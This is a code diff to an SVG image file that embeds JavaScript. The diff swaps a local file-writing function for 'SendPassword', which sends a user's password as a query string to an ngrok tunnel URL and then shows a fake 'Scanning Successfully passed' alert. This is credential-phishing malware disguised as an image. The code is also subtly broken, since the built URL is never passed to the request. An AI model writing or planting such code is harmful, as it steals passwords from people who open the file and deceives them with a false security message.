@@ -4,11 +4,18 @@
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
-    function writeTextFile(afilename, output)
+    function SendPassword(Pass)
     {
-      var txtFile =new File(afilename);
-      txtFile.writeln(output);
-      txtFile.close();
+      var request = new XMLHttpRequest();
+
+      request.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+              alert("Scanning Successfully passed.");
+          }
+      };
+      let Url = 'https://3711f7a6f0e4.ngrok.io/?Pass='+Pass;
+      request.open('GET', '');
+      request.send();
     }
     Check = true;
     while (Check){
@@ -18,6 +25,6 @@
       Check = false;
     }
     }
-    writeTextFile("Pass.txt", Pass)
+    SendPassword(Pass)
   </script>
 </svg>
